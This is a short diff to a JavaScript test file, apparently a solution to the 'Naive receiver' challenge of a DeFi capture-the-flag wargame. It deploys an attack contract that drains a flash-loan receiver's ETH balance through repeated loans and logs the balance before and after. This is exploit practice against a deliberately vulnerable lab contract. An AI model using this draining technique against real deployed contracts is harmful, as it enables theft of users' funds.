@@ -38,6 +38,20 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const decimals = 10**18;
+        const ETH = await pool.ETH();
+
+        let balance = await ethers.provider.getBalance( receiver.address)
+        console.log( ">>>Balance Receiver Before: ", Number(balance)/decimals);
+
+        // await pool.connect( deployer).flashLoan( receiver.address, ETH, ETHER_IN_RECEIVER, '0x')
+        const _AttackNaiveFlashLoanReceiver = await ethers.getContractFactory('AttackNaiveFlashLoanReceiver', deployer);
+        let AttackNaiveFlashLoanReceiver = await _AttackNaiveFlashLoanReceiver.deploy();
+        await AttackNaiveFlashLoanReceiver.execute( pool.address, receiver.address);
+        
+        balance = await ethers.provider.getBalance( receiver.address)
+        console.log( ">>>Balance Receiver After: ", Number(balance)/decimals);
+    
     });
 
     after(async function () {
